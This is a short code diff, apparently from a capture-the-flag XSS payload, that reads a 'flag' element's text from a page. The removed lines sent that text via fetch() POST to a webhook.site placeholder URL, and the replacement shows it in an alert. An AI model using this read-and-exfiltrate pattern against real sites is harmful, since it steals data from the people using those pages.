@@ -16,20 +16,8 @@
                 const flagText = flagElement.innerText || flagElement.textContent; // Get the text content
                 console.log('Extracted Flag:', flagText); // Log the flag to console
 
-                // Send the flag to your webhook
-                fetch("https://webhook.site/YOUR_UNIQUE_ID", {
-                    method: 'POST', // Use POST method
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ flag: flagText }) // Send flag in JSON format
-                })
-                .then(response => {
-                    console.log('Flag sent to webhook:', response);
-                })
-                .catch(error => {
-                    console.error('Error sending flag to webhook:', error);
-                });
+                // Show the flag in an alert
+                alert('Extracted Flag: ' + flagText);
             } else {
                 console.error('Flag element not found.');
             }
